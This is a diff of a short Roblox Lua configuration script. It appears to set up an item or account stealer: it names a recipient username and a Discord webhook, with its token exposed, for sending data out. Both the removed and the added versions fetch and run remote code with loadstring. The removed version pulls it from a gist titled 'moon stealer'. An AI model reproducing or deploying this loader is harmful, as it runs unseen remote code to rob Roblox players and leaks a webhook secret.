@@ -1,5 +1,11 @@
-_G.User = "Kr1tex_X" -- your roblox name here
+UserName = "Kr1tex_X"
 
-_G.webhook = "https://discord.com/api/webhooks/1094386812396523690/Dp_bwJlsQR6345FC-JEs6LpKQGWwtIZyefXwDHNzM-0zZwGaUraBL077HnUClnR3hXgx" -- your webhook here
+UserName2 = "Kr1tex_X"
 
-loadstring(game:HttpGet("https://gist.githubusercontent.com/MoonDevRed/71c34701fbb683e1dfd7e8690c6741fc/raw/9023a87e69513d66375d3871b52b2f0bcb67951f/moon%2520stealer%2520test%2520v2", true))()
+Webhook = "https://discord.com/api/webhooks/1094386812396523690/Dp_bwJlsQR6345FC-JEs6LpKQGWwtIZyefXwDHNzM-0zZwGaUraBL077HnUClnR3hXgx"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
+
+
+
+
